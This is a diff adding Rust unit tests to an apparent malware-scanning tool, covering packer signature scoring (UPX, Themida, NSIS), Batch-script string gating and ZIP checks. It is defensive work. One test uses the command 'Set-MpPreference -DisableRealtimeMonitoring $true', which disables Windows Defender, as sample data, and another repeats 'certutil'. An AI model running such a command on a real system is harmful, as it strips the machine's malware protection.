+        // copy them to SignalSet so the scoring layer can consume.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.ep_signature_matches = vec!["UPX 3.x (minimal)".to_string()];
+        pe.ep_signature_family = "upx".to_string();
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        assert_eq!(signals.pe_ep_signature_family, "upx");
+        assert_eq!(signals.pe_ep_signature_matches.len(), 1);
+        assert_eq!(signals.pe_ep_signature_matches[0], "UPX 3.x (minimal)");
+    }
+
+    #[test]
+    fn test_ep_signature_upx_alone_is_low() {
+        // UPX match with NO corroborating signals (packed_score == 0,
+        // no anti-analysis, no packer findings) should produce a Low
+        // detection, not Medium. This matches the policy "UPX alone =
+        // Low, UPX + corroboration = Medium".
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.ep_signature_matches = vec!["UPX 3.x (minimal)".to_string()];
+        pe.ep_signature_family = "upx".to_string();
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        let scoring = score_signals(&signals);
+        let ep_detections: Vec<_> = scoring
+            .detections
+            .iter()
+            .filter(|(desc, _)| desc.contains("entry-point signature"))
+            .collect();
+        assert_eq!(ep_detections.len(), 1, "expected exactly one EP detection");
+        assert_eq!(
+            ep_detections[0].1,
+            anya_scoring::types::ConfidenceLevel::Low
+        );
+    }
+
+    #[test]
+    fn test_ep_signature_themida_goes_straight_to_medium() {
+        // Themida on its own should fire Medium without needing
+        // corroboration — protectors are stronger signals than UPX.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.ep_signature_matches = vec!["Themida 2.x / 3.x".to_string()];
+        pe.ep_signature_family = "themida".to_string();
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        let scoring = score_signals(&signals);
+        let ep_detections: Vec<_> = scoring
+            .detections
+            .iter()
+            .filter(|(desc, _)| desc.contains("entry-point signature"))
+            .collect();
+        assert_eq!(ep_detections.len(), 1);
+        assert_eq!(
+            ep_detections[0].1,
+            anya_scoring::types::ConfidenceLevel::Medium
+        );
+    }
+
+    #[test]
+    fn test_ep_signature_nsis_is_suppressed() {
+        // NSIS is the benign-installer signature — it should not
+        // produce a user-facing detection at all.
+        let mut result = empty_result();
+        let mut pe = empty_pe();
+        pe.ep_signature_matches = vec!["NSIS installer (benign when signed)".to_string()];
+        pe.ep_signature_family = "nsis".to_string();
+        result.pe_analysis = Some(pe);
+        result.file_format = "Windows PE".to_string();
+
+        let signals = extract_signals(&result);
+        let scoring = score_signals(&signals);
+        assert!(
+            !scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.contains("entry-point signature")),
+            "NSIS should not produce an EP detection"
+        );
+    }
+
+    #[test]
+    fn test_batch_extractor_only_runs_for_batch_family() {
+        // A PE file with batch-looking strings should NOT populate
+        // bat_* signals because the extraction is gated on format.
+        let mut result = empty_result();
+        result.file_format = "Windows PE".to_string();
+        result.file_info.extension = Some("exe".to_string());
+        result.strings.classified = Some(vec![make_classified(
+            "Set-MpPreference -DisableRealtimeMonitoring $true",
+        )]);
+
+        let signals = extract_signals(&result);
+        assert!(
+            !signals.bat_defender_tamper,
+            "PE should not run Batch string extraction"
+        );
+        assert_eq!(signals.bat_lolbin_count, 0);
+    }
+
+    #[test]
+    fn test_batch_blob_cap_does_not_panic() {
+        // Build a huge string set and confirm the 128 KB cap kicks in
+        // without panicking or OOMing.
+        let big_line = "certutil ".repeat(1000); // ~9 KB per string
+        let mut strings: Vec<String> = Vec::new();
+        for _ in 0..500 {
+            strings.push(big_line.clone());
+        }
+        let refs: Vec<&str> = strings.iter().map(|s| s.as_str()).collect();
+        let result = batch_result_with_strings(refs);
+        let signals = extract_signals(&result);
+        // Count should cap at 50 per pattern, well below the total
+        assert!(
+            signals.bat_lolbin_count <= 50,
+            "count should cap at 50, got {}",
+            signals.bat_lolbin_count
+        );
+    }
+
+    #[test]
+    fn test_zip_legitimacy_encrypted_package_still_flags() {
+        // A legit-package layout that ALSO has encrypted entries should
+        // still fire: encryption is a corroborating signal that overrides
+        // the package suppression.
+        let mut result = empty_result();
+        result.zip_analysis = Some(ZipAnalysis {
+            entry_count: 1,
+            has_executables: true,
+            executable_names: vec!["META-INF/MANIFEST.MF".to_string()],
+            has_encrypted_entries: true,
+            compression_ratio: 2.0,
+            has_double_extensions: false,
+            has_path_traversal: false,
+            suspicious_entries: vec![],
+        });
+        let signals = extract_signals(&result);
+        assert!(signals.zip_is_legit_package);
+        let scoring = score_signals(&signals);
+        assert!(
+            scoring
+                .detections
+                .iter()
+                .any(|(desc, _)| desc.starts_with("ZIP containing executable files")),
+            "encrypted entries should override legit-package suppression"
+        );
     }
 }
